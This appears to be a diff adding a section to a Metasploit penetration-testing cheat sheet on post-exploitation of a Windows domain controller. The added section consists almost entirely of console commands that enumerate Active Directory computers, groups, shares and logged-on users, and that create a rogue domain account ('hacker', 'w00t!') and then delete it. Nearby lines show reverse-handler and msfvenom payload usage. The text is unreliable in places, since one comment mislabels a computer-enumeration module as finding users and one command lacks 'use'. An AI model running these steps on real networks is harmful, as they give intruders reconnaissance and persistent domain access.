@@ -327,6 +327,44 @@ Open a new tab:
      setg ReverseAllowProxy true
 ------------------------------------------------------------------------------------------------------
 
+Post exploitation of a domain controller (DC)
+
+# Find all Active Directory users
+msf > use post/windows/gather/enum_ad_computers
+msf post(enum_ad_computers) > set filter objectCategory=computer
+msf post(enum_ad_computers) > set session 1
+msf post(enum_ad_computers) > exploit
+
+Gather all Groups in Active Directory
+msf > use post/windows/gather/enum_ad_groups
+msf post(enum_ad_groups) > set session 1
+msf post(enum_ad_groups) > exploit
+
+# Find all shared folders in Active Directory
+msf > post/windows/gather/enum_shares
+msf post(enum_shares) > set session 1
+msf post(enum_shares) > exploit
+
+#  Add any user in Active Directory
+msf > use post/windows/manage/add_user_domain
+msf post(add_user_domain) > set addtodomain true
+msf post(add_user_domain) > set username hacker
+msf post(add_user_domain) > set password w00t!
+msf post(add_user_domain) > set session 1
+msf post(add_user_domain) > exploit
+
+# Delete any  user in Active Directory
+msf > use post/windows/manage/delete_user
+msf post(delete_user) > set username hacker
+msf post(delete_user) > set session 1
+msf post(delete_user) > exploit
+
+# Enumerate all logged on users
+msf > use post/windows/gather/enum_logged_on_users
+msf post(enum_logged_on_users) > set session 1
+msf post(enum_logged_on_users) > exploit
+------------------------------------------------------------------------------------------------------
+
 # msfvenom
 
 msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>
